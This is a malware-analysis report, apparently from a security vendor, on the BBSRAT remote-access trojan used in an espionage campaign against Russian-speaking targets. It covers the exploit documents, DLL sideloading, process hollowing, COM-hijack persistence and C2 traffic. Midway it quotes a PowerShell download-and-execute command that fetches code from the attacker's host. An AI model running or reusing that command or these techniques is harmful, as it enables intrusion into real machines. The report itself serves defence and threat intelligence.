@@ -1,0 +1,108 @@
+In late 2014, ESET presented an attack campaign that had been observed over a period of time targeting Russia and other Russian speaking nations, dubbed “Roaming Tiger”.
+The attack was found to heavily rely on RTF exploits and at the time, thought to make use of the PlugX malware family.
+ESET did not attribute the attacks to a particular attack group, but noted that the objective of the campaign was espionage and general information stealing.
+Based on data collected from Palo Alto Networks AutoFocus threat intelligence, we discovered continued operations of activity very similar to the Roaming Tiger attack campaign that began in the August 2015 timeframe, with a concentration of attacks in late October and continuing into December.
+The adversaries behind these attacks continued to target Russia and other Russian speaking nations using similar exploits and attack vectors.
+However, while the malware used in these new attacks uses similar infection mechanisms to PlugX, it is a completely new tool with its own specific behavior patterns and architecture.
+We have named this tool “BBSRAT.”
+As described in earlier reports on “Roaming Tiger”, the attack observed in August 2015 used weaponized exploit documents that leave Russian language decoy document files after infecting the system.
+The files exploit the well-known Microsoft Office vulnerability, CVE-2012-0158, to execute malicious code in order to take control of the targeted systems.
+Figure 1 Spear-phishing email delivering BBSRAT
+In one case, the adversary impersonated an individual from the organization Vigstar, a Russian-based research organization in charge of the development of satellite communications and special purpose wireless devices for the Russian Federation’s defense and security agencies.
+The targeted email address appeared to be a Gmail account associated with Vigstar as well, and was found on a job board website for a job opening at Vigstar.
+The rough translation of the body of the email is as follows:
+I send you a “list of international exhibitions of military, civil and dual-purpose, conducted in 2015 on the territory of the Russian Federation and foreign states.” Waiting for your reply!
+Figure 2 confirms that the decoy document that opens after the malware infects the system is indeed a list of international exhibitions that were conducted on Russian territory in 2015.
+Figure 2 Decoy document that is opened after the malicious document has infected the system
+In more recent months, we have identified several other potential Russian victims using AutoFocus.
+Analysis of the command and control (C2) infrastructure shows that the newly discovered samples of BBSRAT used the same C2 domains as previously published in the “Roaming Tiger” campaign, including transactiona.com and futuresgold.com.
+Interestingly, all of the previously published C2 domains have significant overlap amongst the hashes and IPs while C2s for BBSRAT contain no overlap at all.
+This may indicate that for the newer attack campaign using BBSRAT, the adversary may have deployed purpose-built variants and/or infrastructure for each of the intended targets.
+Figure 3 Command and control infrastructure
+BBSRAT is typically packaged within a portable executable file, although in a few of the observed instances, a raw DLL was discovered to contain BBSRAT.
+When the dropper first runs, it will generate a path in the %TEMP% directory.
+The generated filename is 10-16 uppercase alphabetic characters, and ends with a ‘.TMP’ file extension.
+The dropper will continue to write an embedded cab file in this location.
+Figure 4 Header of CAB file dropped by BBSRAT
+The malware will proceed to create one of the following directories depending on what version of Microsoft Windows is running on the target machine:
+%ALLUSERSPROFILE%\SSONSVR
+%ALLUSERSPROFILE%\Application Data\SSONSVR
+Using the built-in expand.exe utility provided by Microsoft Windows, the dropper executes the following command, which will expand the CAB file and write the results to the provided directory:
+expand.exe “%TEMP%\[temp_file]” Destination “[chosen_path]\SSONSVR”
+This results in the following three files being written to the SSONSVR directory:
+aclmain.sdb
+pnipcn.dll
+ssonsvr.exe
+The ‘ssonsvr.exe’ file is a legitimate Citrix executable that will be used to sideload the malicious ‘pnipcn.dll’ file.
+The ‘aclmain.sdb’ file contains code that will eventually be loaded by the ‘pnipcn.dll’ file.
+The malware finally executes ‘ssonsvr.exe’ via a call to ShellExecuteW.
+Figure 5 Execution flow of dropper expanding CAB file
+When ‘ssonsvr.exe’ is executed, and the pnipcn.dll file is loaded, it will begin by identifying the path to msiexec.exe, by expanding the following environment string:
+%SystemRoot%\System32\msiexec.exe
+It will then spawn a suspended instance of msiexec.exe in a new process.
+The malware proceeds to load code from the ‘aclmain.sdb’ file and performs process hollowing against this instance of msiexec.exe prior to resuming the process.
+Figure 6 Sideloading execution flow
+In order to ensure persistence, the following registry key is written on the victim’s machine:
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ssonsvr.exe : [path_to_ssonsvr.exe]
+In the most recently observed sample of BBSRAT found in AutoFocus, the Trojan was deployed via a downloader that used the Invoke-ReflectivePEInjection.ps1 script from the PowerSploit framework.
+When the downloader executes, it will first decrypt the following two strings using a 5-byte XOR key of “\x01\x02\x03\x04\x05”:
+“powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(‘http://testzake.com/IR.ps1’);Invoke-ReflectivePEInjection -PEUrl http://testzake.com/s.exe”
+“C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(‘http://testzake.com/IR.ps1’);Invoke-ReflectivePEInjection -PEUrl http://testzake.com/s.exe”
+These strings are then sequentially executed via calls to WinExec.
+As we can see, the second command is specifically crafted to run on 64-bit versions of Microsoft Windows.
+The commands in question will download an executable file and run it within the context of the powershell process.
+When the above commands are executed, the downloader will initially download the ‘IR.ps1’ powershell script from the specified URL:
+Figure 7 Downloader downloading the Invoke-ReflectivePEInjection PowerSploit script
+This Powershell script appears to have been pulled directly from the PowerSploit framework, with no modifications made.
+The malware then invokes this script with a URL that points to an additional executable file.
+This downloaded executable contains a copy of the BBSRAT malware family.
+The downloader proceeds to drop either a 32-bit or 64-bit DLL file that will execute the two previously stated Powershell commands when the DLL is loaded.
+This DLL is dropped to one of the following locations:
+%SYSTEMROOT%\web\srvcl32.dll
+%APPDATA%\web\srvcl32.dll
+Additionally, the following registry keys are set depending on the system’s CPU architecture:
+HKU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32\ThreadingModel – “Both” HKU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32\Default – [path_to_srvcl32.dll]
+HKLM\SOFTWARE\Classes\CLSID\{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}\InprocServer32\ThreadingModel – “Both” HKLM\SOFTWARE\Classes\CLSID\{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}\InprocServer32\Default – [path_to_srvcl32.dll]
+The COM object for {42aedc87-2188-41fd-b9a3-0c966feabec1} is specific to ‘MruPidlList’, while the COM object for {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} is specific to ‘Microsoft WBEM New Event Subsystem’.
+This ensures that the DLL specified will load when Microsoft Windows starts.
+It is a technique that was used by the ZeroAccess rootkit when it initially surfaced.
+After being loaded using one of the two techniques discussed, BBSRAT malware begins execution by loading the following libraries at runtime:
+ntdll.dll
+kernel32.dll
+user32.dll
+advapi32.dll
+gdi32.dll
+ws2_32.dll
+shell32.dll
+psapi.dll
+Secur32.dll
+WtsApi32.dll
+Netapi32.dll
+Version.dll
+Crypt32.dll
+Wininet.dll
+The following mutex is then created to ensure a single instance of BBSRAT is running at a given time:
+Global\GlobalAcProtectMutex
+Throughout the execution of BBSRAT, it will dynamically load functions prior to calling them, as seen in the example below demonstrating BBSRAT making a call to the WSAStartup function:
+Figure 8 BBSRAT calling WSAStartup function
+The malware proceeds to parse the stored embedded network configuration and spawns a series of threads responsible for network communication.
+This includes a series of HTTP or HTTPS requests, such as the following:
+GET /bbs/1/forum.php?sid=1 HTTP/1.1 Cookie: A46A8AA9-D7D6-43FB-959DC96E Content-Length: User-Agent: Mozilla/4.0 (compatible; Windows NT 5.1) Connection: Keep-Alive Host: transactiona.com Cache-Control: no-cache Accept: */* Content-Type:
+In the above example, the ‘1’ used both in the URI and the sid GET parameter is a global incremental counter.
+Every subsequent request made by BBSRAT increments this counter by one.
+Additionally, all variants of BBSRAT we have found use the same URL for command and control (C2) communication.
+When first executed, the malware will exfiltrate data about the victim’s machine via a POST request to the ‘/bbs/[counter]/forum.php?sid=[counter]’ URL.
+All network data sent via POST requests uses a custom binary structure, as defined as the following:
+The compressed_data field is compressed using the common ZLIB compression algorithm.
+Additionally, in the event data is being sent via HTTP rather than HTTPS, the following additional encryption algorithm is applied to the POST data:
+The following data structure holds the victim’s information that is uploaded by BBSRAT:
+BBSRAT accepts many possible commands that the C2 server can provide.
+These commands are sent as a response to the GET beacons that are continually requested via either HTTP or HTTPS.
+The following commands and sub-commands have been identified:
+Please refer to the appendix for a full list of identified BBSRAT samples and their associated C2 servers.
+As in many of the previous articles regarding espionage-motivated adversaries and possible nation-state campaigns, what is being observed in this attack campaign is a continued operation and evolution by the adversary even after its tactics, techniques, and procedures (TTPs) have become public knowledge.
+Despite the fact that the information about these attackers has been public for over a year, including a listing of many of the command and control servers, they continue to reuse much of their exposed playbook.
+We urge organizations to use the data from Unit 42 and other threat intelligence sources is paramount to proactively secure themselves and prevent attacks.
+WildFire properly classifies BBSRAT malware samples as malicious.
+We have released DNS signatures to block access to the C2 domain names included in this report.
+AutoFocus users can explore these attacks using the BBSRAT malware family tag.
